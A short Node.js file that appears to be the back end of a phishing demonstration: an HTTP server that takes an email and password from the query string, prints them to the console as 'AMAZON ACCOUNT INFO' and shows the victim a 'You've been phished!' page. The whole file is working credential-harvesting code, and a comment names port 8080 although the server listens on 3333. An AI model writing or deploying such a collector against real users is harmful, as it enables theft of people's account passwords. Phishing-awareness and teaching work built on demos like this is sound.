var http = require('http')
var url = require('url')

//create a server object:
http.createServer(function (req, res) {
	
	const query = url.parse(req.url, true).query
	if (query.email && query.password) {
		console.log('AMAZON ACCOUNT INFO')
		console.log(`email: ${query.email}`)
		console.log(`password: ${query.password}`)
		console.log()
	  	
	  	res.write('<body style="text-align: center; margin-top: 20px;">')
	  	res.write('<h1>You\'ve been phished!</h1>') //write a response to the client
	  	// res.write(`<p>email: ${query.email}<br>`)
	  	// res.write(`password: ${query.password}</p>`)
		res.write('</body>')
	}
  	res.end() //end the response
}).listen(3333) //the server object listens on port 8080 